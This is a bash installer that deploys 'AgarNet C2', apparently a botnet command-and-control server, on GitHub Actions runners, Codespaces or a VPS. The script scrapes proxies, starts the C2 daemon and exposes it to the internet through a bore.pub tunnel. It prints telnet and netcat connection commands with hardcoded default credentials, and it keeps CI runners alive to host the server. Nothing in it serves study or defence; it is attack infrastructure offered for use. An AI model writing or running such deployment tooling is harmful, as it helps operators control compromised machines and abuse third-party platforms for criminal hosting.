#!/usr/bin/env bash
# ==============================================================================
# AgarNet C2 - Automated Installer & TCP Tunnel for GitHub Actions / Codespaces / VPS
# ==============================================================================

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m' # No Color

PROJECT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$PROJECT_DIR"

# Sudo detection for GitHub Actions runner / standard user
SUDO=""
if [ "$(id -u)" -ne 0 ]; then
    if command -v sudo &>/dev/null; then
        SUDO="sudo"
    fi
fi

echo -e "${CYAN}${BOLD}"
echo "=========================================================="
echo "      AgarNet C2 - Automated Installer & TCP Tunnel       "
echo "        (GitHub Actions / Codespaces / VPS Ready)         "
echo "=========================================================="
echo -e "${NC}"

# 1. Package Manager & System Dependencies
echo -e "${YELLOW}[1/6] Installing system dependencies...${NC}"
if command -v apt-get &>/dev/null; then
    export DEBIAN_FRONTEND=noninteractive
    $SUDO apt-get update -y -qq
    $SUDO apt-get install -y -qq python3 python3-pip python3-venv curl net-tools telnet
elif command -v dnf &>/dev/null; then
    $SUDO dnf install -y -q python3 python3-pip curl net-tools telnet
elif command -v yum &>/dev/null; then
    $SUDO yum install -y -q python3 python3-pip curl net-tools telnet
fi

# 2. Python Environment Setup
echo -e "${YELLOW}[2/6] Preparing Python environment...${NC}"

# Clean any broken/cross-platform venv copied from another OS
if [ -d "$PROJECT_DIR/venv" ]; then
    if ! "$PROJECT_DIR/venv/bin/python3" -c "exit(0)" 2>/dev/null; then
        echo -e "${YELLOW}[*] Incompatible/broken venv detected. Removing...${NC}"
        rm -rf "$PROJECT_DIR/venv"
    fi
fi

if [ ! -d "$PROJECT_DIR/venv" ]; then
    python3 -m venv "$PROJECT_DIR/venv" 2>/dev/null || true
fi

# Select reliable Python executable
if [ -x "$PROJECT_DIR/venv/bin/python3" ] && "$PROJECT_DIR/venv/bin/python3" -c "exit(0)" 2>/dev/null; then
    PY_BIN="$PROJECT_DIR/venv/bin/python3"
    PIP_FLAGS="--quiet"
else
    echo -e "${YELLOW}[!] Using system python3 environment.${NC}"
    PY_BIN="$(command -v python3)"
    PIP_FLAGS="--break-system-packages --quiet"
fi

# 3. Python Dependencies
echo -e "${YELLOW}[3/6] Installing Python dependencies...${NC}"
"$PY_BIN" -m pip install --upgrade pip $PIP_FLAGS 2>/dev/null || true
if [ -f "$PROJECT_DIR/requirements.txt" ]; then
    "$PY_BIN" -m pip install -r "$PROJECT_DIR/requirements.txt" $PIP_FLAGS 2>/dev/null || true
fi
"$PY_BIN" -m pip install colorama requests $PIP_FLAGS 2>/dev/null || true

# 4. Multi-Source Automated Proxy Scraping (Background)
echo -e "${YELLOW}[4/6] Launching automated proxy scraper...${NC}"
if [ -f "$PROJECT_DIR/src/proxy_scraper.py" ]; then
    "$PY_BIN" "$PROJECT_DIR/src/proxy_scraper.py" || true
fi

# 5. Port and Host Configuration
DEFAULT_PORT=1337
# Non-blocking port assignment (auto-default in GitHub Actions)
if [ -t 0 ] && [ -z "$GITHUB_ACTIONS" ]; then
    read -t 5 -rp "Enter C2 Listening Port [Default: $DEFAULT_PORT]: " INPUT_PORT || true
    PORT="${INPUT_PORT:-$DEFAULT_PORT}"
else
    PORT="$DEFAULT_PORT"
fi

"$PY_BIN" - <<EOF
import json, os
config_data = {"cnc_host": "0.0.0.0", "cnc_port": int("$PORT")}
for path in ["src/config.json", "config.json"]:
    full_path = os.path.join("$PROJECT_DIR", path)
    os.makedirs(os.path.dirname(full_path), exist_ok=True)
    with open(full_path, "w", encoding="utf-8") as f:
        json.dump(config_data, f, indent=2)
EOF

# 6. Start C2 Server in Background
echo -e "${YELLOW}[5/6] Starting C2 server daemon...${NC}"
pkill -f "$PROJECT_DIR/main.py" 2>/dev/null || true
sleep 1
nohup "$PY_BIN" "$PROJECT_DIR/main.py" > "$PROJECT_DIR/c2.log" 2>&1 &
echo $! > "$PROJECT_DIR/c2.pid"

# 7. Start Automated Public Bore TCP Tunnel
echo -e "${YELLOW}[6/6] Launching automated Bore TCP tunnel (zero-config)...${NC}"
ARCH=$(uname -m)
if [ "$ARCH" = "aarch64" ] || [ "$ARCH" = "arm64" ]; then
    BORE_URL="https://github.com/ekzhang/bore/releases/download/v0.5.2/bore-v0.5.2-aarch64-unknown-linux-musl.tar.gz"
else
    BORE_URL="https://github.com/ekzhang/bore/releases/download/v0.5.2/bore-v0.5.2-x86_64-unknown-linux-musl.tar.gz"
fi

if [ ! -f "$PROJECT_DIR/bore" ]; then
    curl -fsSL "$BORE_URL" 2>/dev/null | tar -xz -C "$PROJECT_DIR" 2>/dev/null || true
    chmod +x "$PROJECT_DIR/bore" 2>/dev/null || true
fi

pkill -f "bore local" 2>/dev/null || true
sleep 1
nohup "$PROJECT_DIR/bore" local "$PORT" --to bore.pub > "$PROJECT_DIR/tunnel.log" 2>&1 &
echo $! > "$PROJECT_DIR/tunnel.pid"

# Wait for Bore tunnel port
TUNNEL_REMOTE_PORT=""
for i in {1..10}; do
    sleep 1
    TUNNEL_REMOTE_PORT=$(grep -oE "bore.pub:[0-9]+" "$PROJECT_DIR/tunnel.log" 2>/dev/null | cut -d: -f2 | tail -n 1)
    if [ -n "$TUNNEL_REMOTE_PORT" ]; then
        break
    fi
done

# Read default credentials
USER_NAME="root"
USER_PASS="agarnet123"
if [ -f "$PROJECT_DIR/src/logins.txt" ]; then
    LOGIN_LINE=$(head -n 1 "$PROJECT_DIR/src/logins.txt")
    USER_NAME=$(echo "$LOGIN_LINE" | cut -d: -f1)
    USER_PASS=$(echo "$LOGIN_LINE" | cut -d: -f2)
fi

# Print Final Banner
echo ""
echo -e "${GREEN}${BOLD}================================================================${NC}"
echo -e "${GREEN}${BOLD}      >>> GITHUB ACTIONS C2 IS ACTIVE & CONNECTED <<<          ${NC}"
echo -e "${GREEN}${BOLD}================================================================${NC}"
echo ""
if [ -n "$TUNNEL_REMOTE_PORT" ]; then
    echo -e "${BOLD}Public Host      :${NC} ${CYAN}bore.pub${NC}"
    echo -e "${BOLD}Public Port      :${NC} ${CYAN}${TUNNEL_REMOTE_PORT}${NC}"
    echo -e "${BOLD}Username         :${NC} ${YELLOW}${USER_NAME}${NC}"
    echo -e "${BOLD}Password         :${NC} ${YELLOW}${USER_PASS}${NC}"
    echo ""
    echo -e "${CYAN}${BOLD}>>> TELNET CONNECTION COMMAND (Terminal / CMD / PowerShell / PuTTY):${NC}"
    echo -e "${GREEN}${BOLD}telnet bore.pub ${TUNNEL_REMOTE_PORT}${NC}"
    echo ""
    echo -e "${CYAN}${BOLD}>>> NETCAT CONNECTION COMMAND:${NC}"
    echo -e "${GREEN}${BOLD}nc bore.pub ${TUNNEL_REMOTE_PORT}${NC}"
else
    echo -e "${YELLOW}[!] Tunnel pending. Check tunnel.log for output.${NC}"
fi
echo ""
echo -e "${GREEN}${BOLD}================================================================${NC}"
echo ""

# Helper scripts
cat <<'EOF' > "$PROJECT_DIR/stop.sh"
#!/usr/bin/env bash
DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
if [ -f "$DIR/c2.pid" ]; then kill $(cat "$DIR/c2.pid") 2>/dev/null || true; rm -f "$DIR/c2.pid"; fi
if [ -f "$DIR/tunnel.pid" ]; then kill $(cat "$DIR/tunnel.pid") 2>/dev/null || true; rm -f "$DIR/tunnel.pid"; fi
pkill -f "main.py" 2>/dev/null || true
pkill -f "bore local" 2>/dev/null || true
echo "C2 and tunnels stopped."
EOF
chmod +x "$PROJECT_DIR/stop.sh"

# If in GitHub Actions or called with --keepalive, stay alive and stream live logs
if [ -n "$GITHUB_ACTIONS" ] || [ "$1" = "--keepalive" ]; then
    echo -e "${YELLOW}[*] GitHub Actions environment detected! Keeping runner alive...${NC}"
    echo -e "${YELLOW}[*] Live connection logs below (Cancel workflow to stop):${NC}"
    echo ""
    tail -f "$PROJECT_DIR/c2.log" "$PROJECT_DIR/tunnel.log"
fi
